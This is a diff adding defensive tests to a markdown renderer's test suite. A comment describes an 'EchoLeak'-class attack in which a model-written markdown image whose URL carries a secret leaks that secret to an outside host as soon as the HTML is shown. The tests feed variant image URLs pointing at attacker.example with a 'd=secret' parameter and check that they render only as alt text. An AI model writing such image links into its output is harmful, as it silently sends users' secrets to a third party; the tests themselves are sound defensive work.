@@ -72,6 +72,31 @@ describe("renderMarkdown", () => {
     expect(dropped).not.toContain("x.example");
   });
 
+  // BI-94E08D68 (EchoLeak class): an image renders the moment the HTML is
+  // shown, so a model-written `![](https://host/?d=<secret>)` would send the
+  // secret to that host with no click. With no resolveImage, only same-origin
+  // and embedded images render; anything that leaves the origin is alt text.
+  it("renders no off-origin image by default, so rendering cannot exfiltrate", () => {
+    for (const src of [
+      "https://attacker.example/p.png?d=secret",
+      "http://attacker.example/p.png",
+      "//attacker.example/p.png",
+      "HTTPS://attacker.example/p.png",
+      "/\\attacker.example/p.png",
+    ]) {
+      const html = renderMarkdown(`![leak](${src})`);
+      expect(html).not.toContain("<img");
+      expect(html).not.toContain("attacker.example");
+      expect(html).toContain("[leak]");
+    }
+  });
+
+  it("still renders same-origin and embedded images by default", () => {
+    expect(renderMarkdown("![Chart](/api/docs-asset/c.png)")).toContain('<img src="/api/docs-asset/c.png" alt="Chart">');
+    expect(renderMarkdown("![Rel](images/c.png)")).toContain('<img src="images/c.png" alt="Rel">');
+    expect(renderMarkdown("![Dot](data:image/png;base64,iVBORw0KGgo=)")).toContain('src="data:image/png;base64,iVBORw0KGgo="');
+  });
+
   it("lets the caller render a fence, and falls back to <pre> when it declines", () => {
     const html = renderMarkdown("```mermaid\ngraph TD\n```\n\n```js\nx\n```", {
       renderFence: (language) => (language === "mermaid" ? '<img alt="Diagram">\n' : null),
